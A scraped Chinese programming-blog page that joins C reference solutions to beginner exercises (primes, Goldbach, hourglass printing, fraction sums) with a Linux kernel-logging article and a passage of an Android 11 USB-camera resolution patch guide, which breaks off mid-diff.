}7-8 输出下三角队形，数值从大到小，逐渐增长输出下三角队形，数值从大到小，逐渐增长输入格式:m输出格式:12 13 2 14 3 2 15 4 3 2 16 5 4 3 2 1输入样例:在这里给出一组输入。例如：6输出样例:在这里给出相应的输出。例如：1 
2 1 
3 2 1 
4 3 2 1 
5 4 3 2 1 
6 5 4 3 2 1参考答案：#include&lt;stdio.h&gt;
int main() {int n;scanf("%d",&amp;n);for (int i = 1; i &lt;= n; i++) {for (int j = i; j &gt;= 1; j--) {printf("%d ",j);}printf("\n");}
}7-9 素数对猜想让我们定义dn​为：dn​=pn+1​−pn​，其中pi​是第i个素数。显然有d1​=1，且对于n&gt;1有dn​是偶数。“素数对猜想”认为“存在无穷多对相邻且差为2的素数”。现给定任意正整数N(&lt;105)，请计算不超过N的满足猜想的素数对的个数。输入格式:输入在一行给出正整数N。输出格式:在一行中输出不超过N的满足猜想的素数对的个数。输入样例:20输出样例:4参考答案：#include&lt;stdio.h&gt;
#include &lt;stdbool.h&gt;
bool isPrime(int x) {bool flag = true;if (x == 1) flag = false;if (x == 2) flag = true;if (x &gt; 2) {for (int i = 2; i &lt;= sqrt(x); i++) {if (x%i == 0) {flag = false;break;}}}return flag;
}int main(){int n;scanf("%d",&amp;n);int prime[9999];int index = 0;int ans = 0;for (int i = 1; i &lt;= n; i++) {if (isPrime(i) == true) {prime[index] = i;index++;}}for (int i = 1; i &lt; index; i++) {if (prime[i] - prime[i-1] == 2) {ans++;}}printf("%d",ans);
}7-10 求n以内最大的k个素数以及它们的和本题要求计算并输出不超过n的最大的k个素数以及它们的和。输入格式:输入在一行中给出n(10≤n≤10000)和k(1≤k≤10)的值。输出格式:在一行中按下列格式输出:素数1+素数2+…+素数k=总和值其中素数按递减顺序输出。若n以内不够k个素数，则按实际个数输出。输入样例1:1000 10输出样例1:997+991+983+977+971+967+953+947+941+937=9664输入样例2:12 6输出样例2:11+7+5+3+2=28参考答案：#include&lt;stdio.h&gt;
int isPrime(int x) {int flag = 1;if (x == 1) flag = 0;if (x == 2) flag = 1;if (x &gt; 2) {for (int i = 2; i &lt;= sqrt(x); i++) {if (x%i == 0) {flag = 0;break;}}}return flag;
}
int main(){int n, k;scanf("%d %d",&amp;n, &amp;k);int sum = 0;int flag = 1;while(n &gt; 0 &amp;&amp; k &gt; 0) {if (isPrime(n) == 1) {if (flag == 0) printf("+");printf("%d",n);sum += n;flag = 0;k--;}n--;}printf("=%d",sum);
}7-11 查找孪生素数孪生素数是指间隔为2的两个相邻素数，因为它们之间的距离已经近得不能再近了，如同孪生兄弟一样，故将这一对素数称为孪生素数。例如(3,5)，(5,7)，(11,13)等输入2个正整数m和n 求两个数之间的所有孪生素数。输入格式:在一行中输入2个整数m和n 。输出格式:若该区间有：则输出形如(3,5)素数对，一行输出一对，在最后一行统计输出共有几对孪生素数若区间没有：输出“没有找到”输入样例1:2 20输出样例1:(3,5)
(5,7)
(11,13)
(17,19)
共找到4对孪生素数输入样例2:18  25输出样例2:没有找到参考答案：#include&lt;stdio.h&gt;
#include &lt;stdbool.h&gt;
bool isPrime(int x) {bool flag = true;if (x == 1) flag = false;if (x == 2) flag = true;if (x &gt; 2) {for (int i = 2; i &lt;= sqrt(x); i++) {if (x%i == 0) {flag = false;break;}}}return flag;
}
int main(){int m,n;scanf("%d %d",&amp;m, &amp;n);if (m &gt; n) {int temp = m;m = n;n = temp;}int prime[9999];int index = 0;int ans = 0;for (int i = m; i &lt;= n; i++) {if (isPrime(i) == true) {prime[index] = i;index++;}}for (int i = 1; i &lt; index; i++) {if (prime[i] - prime[i-1] == 2) {ans++;printf("(%d,%d)\n",prime[i-1],prime[i]);}}if (ans == 0) {printf("没有找到");}else{printf("共找到%d对孪生素数",ans);}
}7-12 验证“哥德巴赫猜想”数学领域著名的“哥德巴赫猜想”的大致意思是：任何一个大于2的偶数总能表示为两个素数之和。比如：24=5+19，其中5和19都是素数。本实验的任务是设计一个程序，验证20亿以内的偶数都可以分解成两个素数之和。输入格式：输入在一行中给出一个(2, 2 000 000 000]范围内的偶数N。输出格式：在一行中按照格式“N = p + q”输出N的素数分解，其中p ≤ q均为素数。又因为这样的分解不唯一（例如24还可以分解为7+17），要求必须输出所有解中p最小的解。输入样例：24输出样例：24 = 5 + 19参考答案：#include&lt;stdio.h&gt;
#include &lt;stdbool.h&gt;
bool isPrime(int x) {bool flag = true;if (x == 1) flag = false;if (x == 2) flag = true;if (x &gt; 2) {for (int i = 2; i &lt;= sqrt(x); i++) {if (x%i == 0) {flag = false;break;}}}return flag;
}
int main(){int n;scanf("%d",&amp;n);for(int i = 2; i &lt;= n; i++) {if (isPrime(i) == true &amp;&amp; isPrime(n-i) == true) {printf("%d = %d + %d",n,i,n-i);break;}}
}7-13 天梯赛座位分配天梯赛每年有大量参赛队员，要保证同一所学校的所有队员都不能相邻，分配座位就成为一件比较麻烦的事情。为此我们制定如下策略：假设某赛场有 N 所学校参赛，第 i 所学校有 M[i] 支队伍，每队 10 位参赛选手。令每校选手排成一列纵队，第 i+1 队的选手排在第 i 队选手之后。从第 1 所学校开始，各校的第 1 位队员顺次入座，然后是各校的第 2 位队员…… 以此类推。如果最后只剩下 1 所学校的队伍还没有分配座位，则需要安排他们的队员隔位就坐。本题就要求你编写程序，自动为各校生成队员的座位号，从 1 开始编号。输入格式：输入在一行中给出参赛的高校数 N （不超过100的正整数）；第二行给出 N 个不超过10的正整数，其中第 i 个数对应第 i 所高校的参赛队伍数，数字间以空格分隔。输出格式：从第 1 所高校的第 1 支队伍开始，顺次输出队员的座位号。每队占一行，座位号间以 1 个空格分隔，行首尾不得有多余空格。另外，每所高校的第一行按“#X”输出该校的编号X，从 1 开始。输入样例：3
3 4 2输出样例：#1
1 4 7 10 13 16 19 22 25 28
31 34 37 40 43 46 49 52 55 58
61 63 65 67 69 71 73 75 77 79
#2
2 5 8 11 14 17 20 23 26 29
32 35 38 41 44 47 50 53 56 59
62 64 66 68 70 72 74 76 78 80
82 84 86 88 90 92 94 96 98 100
#3
3 6 9 12 15 18 21 24 27 30
33 36 39 42 45 48 51 54 57 60参考答案：#include&lt;stdio.h&gt;
int main()
{int n = 0;scanf("%d", &amp;n);int num[120] = {0};int max = 0;int id = 0;int pos[120][15][15] = {0};int pre = 0;//输入各高校队伍数并求出最大的队伍数for (int i = 1; i &lt;= n; i++){scanf("%d", &amp;num[i]);max = num[i] &gt; max ? num[i] : max;}//编号for (int j = 1; j &lt;= max; j++){for (int k = 1; k &lt;= 10; k++){for (int i = 1; i &lt;= n; i++){if (j &lt;= num[i]){//同一个学校隔位坐if (pre == i){id += 2;}else{//不同学校正常坐id += 1;}pre = i;pos[i][j][k] = id;}}}}//打印编号信息for (int i = 1; i &lt;= n; i++){printf("#%d\n", i);for (int j = 1; j &lt;= num[i]; j++){for (int k = 1; k &lt;= 10; k++){if (k &gt; 1){printf(" ");}printf("%d", pos[i][j][k]);}printf("\n");}}return 0;
}7-14 打印沙漏本题要求你写个程序把给定的符号打印成沙漏的形状。例如给定17个“*”，要求按下列格式打印************
*****所谓“沙漏形状”，是指每行输出奇数个符号；各行符号中心对齐；相邻两行符号数差2；符号数先从大到小顺序递减到1，再从小到大顺序递增；首尾符号数相等。给定任意N个符号，不一定能正好组成一个沙漏。要求打印出的沙漏能用掉尽可能多的符号。输入格式:输入在一行给出1个正整数N（≤1000）和一个符号，中间以空格分隔。输出格式:首先打印出由给定符号组成的最大的沙漏形状，最后在一行中输出剩下没用掉的符号数。输入样例:19 *输出样例:************
*****
2参考答案：#include&lt;stdio.h&gt;
#include&lt;math.h&gt;
int main(){int n;char c;scanf("%d %c",&amp;n,&amp;c);int m=sqrt((n+1)/2);for(int i = 1;i &lt;= m; i++){for(int j = 0; j &lt; i-1; j++){printf(" ");}for(int j = 1; j &lt;= 2*m-2*i+1; j++){printf("%c",c);}printf("\n");}for(int i = 1; i &lt;= m-1; i++){for(int j = 1; j &lt;= m-i-1; j++){printf(" ");}for(int j = 1; j &lt;= 2*(i+1)-1; j++){printf("%c",c);}printf("\n");}printf("%d",n-2*m*m+1);
}7-15 币值转换输入一个整数（位数不超过9位）代表一个人民币值（单位为元），请转换成财务要求的大写中文格式。如23108元，转换后变成“贰万叁仟壹百零捌”元。为了简化输出，用小写英文字母a-j顺序代表大写数字0-9，用S、B、Q、W、Y分别代表拾、百、仟、万、亿。于是23108元应被转换输出为“cWdQbBai”元。输入格式：输入在一行中给出一个不超过9位的非负整数。输出格式：在一行中输出转换后的结果。注意“零”的用法必须符合中文习惯。输入样例1：813227345输出样例1：iYbQdBcScWhQdBeSf输入样例2：6900输出样例2：gQjB参考答案：#include&lt;stdio.h&gt;
int main()
{char rate[10] = {'0','0','S','B','Q','W','S','B','Q','Y'};char flag[10] = {'a','b','c','d','e','f','g','h','i','j'};char num[10];int n;scanf("%d",&amp;n);if(n == 0){printf("a");return 0;}int i = 0;while(n != 0){num[i+1] = n % 10;n /= 10;i++;}for(i ; i &gt; 0 ; i--){if(num[i] == 0 &amp;&amp;num[i-1] == 0){if(i == 5){printf("%c",rate[i]);}continue;}printf("%c",flag[num[i]]);if(i != 1 &amp;&amp; num[i] != 0){printf("%c",rate[i]);}}return 0;
}7-16 N个数求和本题的要求很简单，就是求N个数字的和。麻烦的是，这些数字是以有理数分子/分母的形式给出的，你输出的和也必须是有理数的形式。输入格式：输入第一行给出一个正整数N（≤100）。随后一行按格式a1/b1 a2/b2 ...给出N个有理数。题目保证所有分子和分母都在长整型范围内。另外，负数的符号一定出现在分子前面。输出格式：输出上述数字和的最简形式 —— 即将结果写成整数部分 分数部分，其中分数部分写成分子/分母，要求分子小于分母，且它们没有公因子。如果结果的整数部分为0，则只输出分数部分。输入样例1：5
2/5 4/15 1/30 -2/60 8/3输出样例1：3 1/3输入样例2：2
4/3 2/3输出样例2：2输入样例3：3
1/3 -1/6 1/8输出样例3：7/24参考答案：#include&lt;stdio.h&gt;
typedef long long ll;
int n;
ll zi[110];
ll mu[110];
//求最大公因数，用于化简
ll gcd(ll a,ll b) {return a%b == 0 ? b : gcd(b, a%b);
}
int main()
{scanf("%d",&amp;n);for (int i = 1; i &lt;= n; i++) {scanf("%lld/%lld",&amp;zi[i],&amp;mu[i]);}//只有一个分数直接输出if (n == 1) {printf("%lld/%lld\n",zi[1]/(gcd(zi[1],mu[1])),mu[1]/(gcd(zi[1],mu[1])));}else {ll a = zi[1];ll b = mu[1];for (int i = 2; i &lt;= n; i++) {a = a*mu[i] + zi[i]*b;b *= mu[i];int temp_a = a/gcd(a,b);int temp_b = b/gcd(a,b);a = temp_a;b = temp_b;}if (a%b == 0) {printf("%lld",a/b);}else {//处理真分数if (a &lt; b) {printf("%lld/%lld",a/gcd(a,b),b/gcd(a,b));}//处理假分数else {printf("%lld %lld/%lld",a/b, (a%b)/gcd(a%b,b), b/gcd(a%b,b));}}}}http://www.ppmy.cn/news/1540376.html相关文章【Linux】进程ID和线程ID在日志中的体现在分析内核打印日志流程的时候&amp;#xff0c;发现有时候同一个进程函数调用关系比较混乱&amp;#xff08;因为只打印了进程号&amp;#xff09;&amp;#xff0c;现象就是一个函数走着走着不知道走哪里去了。  
另一个现象是&amp;#xff0c;在Linux启动Firefox的时候&amp;#xff0c;启了大概80个进程&amp;…阅读更多...android11 usb摄像头添加多分辨率支持部分借鉴于&amp;#xff1a;https://blog.csdn.net/weixin_45639314/article/details/142210634 
目录 
一、需求介绍 
二、UVC介绍 
三、解析 
四、补丁修改 
1、预览的限制主要存在于hal层和framework层 
2、添加所需要的分辨率&amp;#xff1a; 
3、hal层修改 
4、frameworks 
5、备…阅读更多...视频美颜SDK与直播平台的融合：实现实时美颜的技术方案详解视频美颜SDK作为一种技术解决方案&amp;#xff0c;已经广泛应用于各类直播平台中&amp;#xff0c;实现了实时美颜效果的优化。那么&amp;#xff0c;视频美颜SDK是如何与直播平台融合&amp;#xff0c;打造高效的实时美颜效果的&amp;#xff1f;本文将对此技术方案进行详细解析。 
一、视频美颜SDK的核…阅读更多...滚雪球学Redis[6.2讲]：Redis脚本与Lua：深入掌握Redis中的高效编程技巧全文目录&amp;#xff1a; &amp;#x1f4dd;前言&amp;#x1f6a6;正文&amp;#x1f31f;6.2.1 Lua脚本的优势&amp;#x1f58b;️6.2.2 EVAL命令与Lua脚本编写&amp;#x1f435;编写Lua脚本的基本步骤&amp;#x1f436;示例&amp;#xff1a;简单的GET和SET操作&amp;#x1f431;示例&amp;#xff1a;Lua实现自增和过期…阅读更多...FFMPEG录屏（19）--- 枚举Windows下的屏幕列表，并获取名称、缩略图在Windows下枚举显示器列表并获取名称、缩略图 
在Windows系统中&amp;#xff0c;枚举显示器列表并获取它们的名称和缩略图是一个常见的需求。本文将详细介绍如何实现这一功能&amp;#xff0c;涉及到的主要技术包括Windows API和C编程。 
获取显示器信息 
首先&amp;#xff0c;我们需要一个…阅读更多...【升华】python基础包NumPy学习NumPy是使用Python进行科学计算的基础软件包。除其他外&amp;#xff0c;它包括&amp;#xff1a; 
功能强大的N维数组对象。精密广播功能函数。集成 C/C和Fortran 代码的工具。强大的线性代数、傅立叶变换和随机数功能。 
# 1、安装包
$ pip install numpy# 2、进入python的交互式界面
$…阅读更多...FFmpeg 4.3 音视频-多路H265监控录放C++开发四 ：RGB颜色一  RGB 的意义&amp;#xff1f; 为什么要从RGB 开始讲起呢&amp;#xff1f; 
因为最终传输到显卡显示器的颜色都是RGB 
即使能处理YUV的API&amp;#xff0c;本质上也是帮你做了从 YUV 到 RGB的转换。 RGB888 表示 R 占8bit&amp;#xff0c;G 占8bit&amp;#xff0c;B 占8bit&amp;#xff0c;也就是每一…阅读更多...解锁A/B测试：如何用数据驱动的实验提升你的网站和应用来源&amp;#xff1a;Gallo, A. (2017, June 28). A refresher on A/B testing. Harvard Business Review. https://hbr.org/2017/06/a-refresher-on-ab-testing 
在数字化时代&amp;#xff0c;我们每天都在被大量的信息和广告轰炸。那么&amp;#xff0c;如何让你的网站或应用脱颖而出&amp;…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:16 +0000</pubDate>
    </item>
    <item>
      <title>【Linux】进程ID和线程ID在日志中的体现</title>
      <link>https://www.ppmy.cn/news/1540375.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【Linux】进程ID和线程ID在日志中的体现news/2025/10/31 17:53:15/在分析内核打印日志流程的时候，发现有时候同一个进程函数调用关系比较混乱（因为只打印了进程号），现象就是一个函数走着走着不知道走哪里去了。另一个现象是，在Linux启动Firefox的时候，启了大概80个进程，其实这个时候也有点怀疑：Linux内核裁剪后编译重启查看日志_哔哩哔哩_bilibili有点类似开始分析打印日志的时候，有多进程时，如果未把多进程的ID打印出来，是不太容易分析出来函数调用流程的，如下图所示红色方框这个字段，（注意，这图未针对函数调用关系混乱）本来想的是，会不会是因为进程内多线程函数调用导致？然后在网上搜索了下：看到一篇文章：https://zhuanlan.zhihu.com/p/673084366然后看了下fork.c的copy_process，然后看到创建进程后的pid和tgid的设置，如下图所示：这里可以看出，在创建进程的时候（实际有可能是线程） ，这个pid是不断变化的，但是如果是创建线程，tgid的值实际上是父进程的值，从上图中可以看出，父进程的tgid值是等于pid的值的（2507行和2516行）。那么在原有的日志打印宏基础上需要添加task_struct-&gt;pgid的值，并且需要验证是不是这回事（其实原来的宏里已经包含这一字段）：这里需要注意的是：1、测试的时候打印日志开关：touch LOG_MORE2、日志增长速度很快，日志打印开关打开了10秒，在这10秒内打开FireFox，然后访问百度，百度网页打开后，马上关闭日志打印：touch LOG_STOP，这个过程持续10多秒，日志63M：然后查找进程名为：firefox的进程基于上面的描述，这个进程应该是主进程，再找找看看有没有线程：等等。这个pr_info_self打印宏其实还挺厉害，尤其是结合内核裁剪后，说不定更厉害。。。。。感谢阅读。http://www.ppmy.cn/news/1540375.html相关文章android11 usb摄像头添加多分辨率支持部分借鉴于&amp;#xff1a;https://blog.csdn.net/weixin_45639314/article/details/142210634 
目录 
一、需求介绍 
二、UVC介绍 
三、解析 
四、补丁修改 
1、预览的限制主要存在于hal层和framework层 
2、添加所需要的分辨率&amp;#xff1a; 
3、hal层修改 
4、frameworks 
5、备…阅读更多...视频美颜SDK与直播平台的融合：实现实时美颜的技术方案详解视频美颜SDK作为一种技术解决方案&amp;#xff0c;已经广泛应用于各类直播平台中&amp;#xff0c;实现了实时美颜效果的优化。那么&amp;#xff0c;视频美颜SDK是如何与直播平台融合&amp;#xff0c;打造高效的实时美颜效果的&amp;#xff1f;本文将对此技术方案进行详细解析。 
一、视频美颜SDK的核…阅读更多...滚雪球学Redis[6.2讲]：Redis脚本与Lua：深入掌握Redis中的高效编程技巧全文目录&amp;#xff1a; &amp;#x1f4dd;前言&amp;#x1f6a6;正文&amp;#x1f31f;6.2.1 Lua脚本的优势&amp;#x1f58b;️6.2.2 EVAL命令与Lua脚本编写&amp;#x1f435;编写Lua脚本的基本步骤&amp;#x1f436;示例&amp;#xff1a;简单的GET和SET操作&amp;#x1f431;示例&amp;#xff1a;Lua实现自增和过期…阅读更多...FFMPEG录屏（19）--- 枚举Windows下的屏幕列表，并获取名称、缩略图在Windows下枚举显示器列表并获取名称、缩略图 
在Windows系统中&amp;#xff0c;枚举显示器列表并获取它们的名称和缩略图是一个常见的需求。本文将详细介绍如何实现这一功能&amp;#xff0c;涉及到的主要技术包括Windows API和C编程。 
获取显示器信息 
首先&amp;#xff0c;我们需要一个…阅读更多...【升华】python基础包NumPy学习NumPy是使用Python进行科学计算的基础软件包。除其他外&amp;#xff0c;它包括&amp;#xff1a; 
功能强大的N维数组对象。精密广播功能函数。集成 C/C和Fortran 代码的工具。强大的线性代数、傅立叶变换和随机数功能。 
# 1、安装包
$ pip install numpy# 2、进入python的交互式界面
$…阅读更多...FFmpeg 4.3 音视频-多路H265监控录放C++开发四 ：RGB颜色一  RGB 的意义&amp;#xff1f; 为什么要从RGB 开始讲起呢&amp;#xff1f; 
因为最终传输到显卡显示器的颜色都是RGB 
即使能处理YUV的API&amp;#xff0c;本质上也是帮你做了从 YUV 到 RGB的转换。 RGB888 表示 R 占8bit&amp;#xff0c;G 占8bit&amp;#xff0c;B 占8bit&amp;#xff0c;也就是每一…阅读更多...解锁A/B测试：如何用数据驱动的实验提升你的网站和应用来源&amp;#xff1a;Gallo, A. (2017, June 28). A refresher on A/B testing. Harvard Business Review. https://hbr.org/2017/06/a-refresher-on-ab-testing 
在数字化时代&amp;#xff0c;我们每天都在被大量的信息和广告轰炸。那么&amp;#xff0c;如何让你的网站或应用脱颖而出&amp;…阅读更多...通信工程学习：什么是VPN虚拟私人网络VPN&amp;#xff1a;虚拟私人网络 VPN&amp;#xff0c;即虚拟私人网络&amp;#xff08;Virtual Private Network&amp;#xff09;&amp;#xff0c;是一种通过公共网络&amp;#xff08;如互联网&amp;#xff09;建立的加密连接&amp;#xff0c;用于保护用户的网络连接和数据传输的安全与隐私。以下是关于VPN的详细…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:15 +0000</pubDate>
    </item>
    <item>
      <title>android11 usb摄像头添加多分辨率支持</title>
      <link>https://www.ppmy.cn/news/1540374.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维android11 usb摄像头添加多分辨率支持news/2025/10/31 17:53:14/部分借鉴于：https://blog.csdn.net/weixin_45639314/article/details/142210634目录一、需求介绍二、UVC介绍三、解析四、补丁修改1、预览的限制主要存在于hal层和framework层2、添加所需要的分辨率：3、hal层修改4、frameworks5、备用方案一、需求介绍这个问题是碰到了一个客户，他的需求是在Android11 rk3566上需要支持1080p以上的usb摄像头支持，而在我们Android11系统原生的相机中可以打开的最大分辨率也是1080p（即2.1百万像素）。而我们客户需要支持2560*1440（2k-四百万像素），和最大3840*2610（4k-800万像素）。二、UVC介绍UVC（USB Video Class）是一种 USB 设备类标准，允许通过 USB 连接的视频设备（如摄像头、网络摄像头和其他视频捕捉设备）与计算机或其他主机设备进行通信。UVC 使得视频设备的使用变得更加简单和通用，因为它不需要特定的驱动程序，主机操作系统通常可以直接识别和使用这些设备。特点：1、即插即用:UVC 设备可以在连接到主机时自动识别，无需安装额外的驱动程序。这使得用户能够快速方便地使用视频设备。2、跨平台支持:UVC 设备通常可以在多种操作系统上工作，包括 Windows、macOS 和 Linux。这种跨平台的兼容性使得 UVC 成为视频设备的标准选择。3、视频格式支持:UVC 支持多种视频格式和分辨率，包括 MJPEG、YUY2、H.264 等。设备可以根据主机的能力和应用程序的需求选择合适的格式。4、控制功能:UVC 设备通常支持多种控制功能，例如亮度、对比度、饱和度、焦距等。这些控制可以通过 USB 接口进行调整。5、流媒体支持:UVC 设备可以用于实时视频流传输，适用于视频会议、直播、监控等应用场景。三、解析1、v4l2命令的使用//列出所有设视频设备
v4l2-ctl --list-devices                
//获取特定设备的支持格式
v4l2-ctl --device=/dev/video23 --list-formats
//获取设备支持的分辨率
v4l2-ctl -d /dev/video23 --list-framesizes=YUYV2、查看打开的摄像头的各种信息dumpsys media.camera四、补丁修改1、预览的限制主要存在于hal层和framework层关于摄像头部分的源码目录：#SDK 接口
frameworks/base/core/java/android/hardware/Camera.java
frameworks/base/core/jni/android_hardware_Camera.cpp#上层 Camera 服务
frameworks/av/camera/# HAL层
hardware/rockchip/camera
hardware/interfaces/camera/# 配置文件，对应USB和CSI之类的摄像头配置
# 包含了支持分辨率，闪光灯等等的一些特性。
device/rockchip/common/external_camera_config.xml
hardware/rockchip/camera/etc/camera/2、添加所需要的分辨率：diff --git a/device/rockchip/common/external_camera_config.xml b/device/rockchip/common/external_camera_config.xml
index d377826..d5ddd9d 100755
--- a/external_camera_config.xml
+++ b/external_camera_config.xml
@@ -60,13 +60,18 @@&lt;Limit  width="1600" height="1200" fpsBound="15.0" /&gt;&lt;Limit  width="1920" height="1080" fpsBound="30.0" /&gt;&lt;Limit  width="1920" height="1080" fpsBound="15.0" /&gt;
+            &lt;Limit  width="2560" height="1440" fpsBound="30.0" /&gt;
+            &lt;Limit  width="2560" height="1440" fpsBound="15.0" /&gt;&lt;Limit  width="2592" height="1944" fpsBound="30.0" /&gt;&lt;Limit  width="2592" height="1944" fpsBound="15.0" /&gt;&lt;Limit  width="2592" height="1944" fpsBound="10.0" /&gt;&lt;Limit  width="2592" height="1944" fpsBound="5.0" /&gt;
+            &lt;Limit  width="3840" height="2160" fpsBound="30.0" /&gt;
+            &lt;Limit  width="3840" height="2160" fpsBound="15.0" /&gt;&lt;!-- image size larger than the last entry will not be supported--&gt;&lt;/FpsList&gt;&lt;!-- orientation --&gt;
-        &lt;Orientation  degree="90"/&gt;
+       &lt;!--        &lt;Orientation  degree="90"/&gt;     这里调整的是摄像头的旋转方向 --&gt;
+       &lt;Orientation  degree="0"/&gt;      &lt;!-- for qipai camera --&gt;&lt;/Device&gt;&lt;/ExternalCamera&gt;3、hal层修改源码路径：hardware/interfaces/camera/device/3.4/default/RgaCropScale.cppdiff --git a/hardware/interfaces/camera/device/3.4/default/RgaCropScale.cpp b/hardware/interfaces/camera/device/3.4/default/RgaCropScale.cpp
index 55a2c3d08d..d3eb278093 100644
--- a/hardware/interfaces/camera/device/3.4/default/RgaCropScale.cpp
+++ b/hardware/interfaces/camera/device/3.4/default/RgaCropScale.cpp
@@ -21,21 +21,21 @@
namespace android {
namespace camera2 {
-#if (defined(TARGET_RK32) || defined(TARGET_RK3368))
+//#if (defined(TARGET_RK32) || defined(TARGET_RK3368))
#define RGA_VER (2.0)
#define RGA_ACTIVE_W (4096)
#define RGA_VIRTUAL_W (4096)
#define RGA_ACTIVE_H (4096)
#define RGA_VIRTUAL_H (4096)
-#else
-#define RGA_VER (1.0)
-#define RGA_ACTIVE_W (2048)
-#define RGA_VIRTUAL_W (4096)
-#define RGA_ACTIVE_H (2048)
-#define RGA_VIRTUAL_H (2048)
+//#else
+//#define RGA_VER (1.0)
+//#define RGA_ACTIVE_W (2048)
+//#define RGA_VIRTUAL_W (4096)
+//#define RGA_ACTIVE_H (2048)
+//#define RGA_VIRTUAL_H (2048)
-#endif
+//#endif
int RgaCropScale::CropScaleNV12Or21(struct Params* in, struct Params* out)4、frameworks源码路径：frameworks/av/services/camera/libcameraservice/api1/client2/Parameters.h上层接口解除1080P的限制。diff --git a/frameworks/av/services/camera/libcameraservice/api1/client2/Parameters.h b/frameworks/av/services/camera/libcameraservice/api1/client2/Parameters.h
index 3a709c9791..163d060b81 100644
--- a/frameworks/av/services/camera/libcameraservice/api1/client2/Parameters.h
+++ b/frameworks/av/services/camera/libcameraservice/api1/client2/Parameters.h
@@ -199,11 +199,11 @@ struct Parameters {// Max preview size allowed// This is set to a 1:1 value to allow for any aspect ratio that has// a max long side of 1920 pixels
-    static const unsigned int MAX_PREVIEW_WIDTH = 1920;
-    static const unsigned int MAX_PREVIEW_HEIGHT = 1920;
+    static const unsigned int MAX_PREVIEW_WIDTH = 4656;
+    static const unsigned int MAX_PREVIEW_HEIGHT = 3496;// Initial max preview/recording size bound
-    static const int MAX_INITIAL_PREVIEW_WIDTH = 1920;
-    static const int MAX_INITIAL_PREVIEW_HEIGHT = 1080;
+    static const int MAX_INITIAL_PREVIEW_WIDTH = 4656;
+    static const int MAX_INITIAL_PREVIEW_HEIGHT = 3496;// Aspect ratio tolerancestatic const CONSTEXPR float ASPECT_RATIO_TOLERANCE = 0.001;// Threshold for slow jpeg mode到这里，系统相机—设置—分辨率与画质，应该就可以看到对应的最大的分辨率了。5、备用方案如果以上修改未能生效，可参考以下修改（该部分有经RK厂商修改）：hardware/interfaces/cameraFrom 75e1d29219f929404f3b42b994ac36dde19b0c82 Mon Sep 17 00:00:00 2001
From: Wang Panzhenzhuan &lt;randy.wang@rock-chips.com&gt;
Date: Tue, 19 Jan 2021 21:26:03 +0800
Subject: [PATCH 1/4] Camera: fix loss resolution issuesSigned-off-by: Wang Panzhenzhuan &lt;randy.wang@rock-chips.com&gt;
Change-Id: I01f614eec54168ab34e0c7376296a64804af9a1a
---.../3.4/default/ExternalCameraDevice.cpp      | 75 ++++++++++++++++---.../3.4/default/ExternalCameraUtils.cpp       |  0.../ExternalCameraUtils.h                     |  1 +3 files changed, 65 insertions(+), 11 deletions(-)mode change 100644 =&gt; 100755 camera/device/3.4/default/ExternalCameraUtils.cppmode change 100644 =&gt; 100755 camera/device/3.4/default/include/ext_device_v3_4_impl/ExternalCameraUtils.hdiff --git a/camera/device/3.4/default/ExternalCameraDevice.cpp b/camera/device/3.4/default/ExternalCameraDevice.cpp
index d196e4b4f..882698fd3 100755
--- a/camera/device/3.4/default/ExternalCameraDevice.cpp
+++ b/camera/device/3.4/default/ExternalCameraDevice.cpp
@@ -338,6 +338,7 @@ status_t ExternalCameraDevice::initDefaultCharsKeys(// android.jpegconst int32_t jpegAvailableThumbnailSizes[] = {0, 0,
+                                                  160, 120,176, 144,240, 144,256, 144,
@@ -587,15 +588,24 @@ status_t ExternalCameraDevice::initOutputCharskeysByFormat(return UNKNOWN_ERROR;}+    ALOGV("inputfourcc:%c%c%c%c",
+        fourcc &amp; 0xFF,
+        (fourcc &gt;&gt; 8) &amp; 0xFF,
+        (fourcc &gt;&gt; 16) &amp; 0xFF,
+        (fourcc &gt;&gt; 24) &amp; 0xFF);
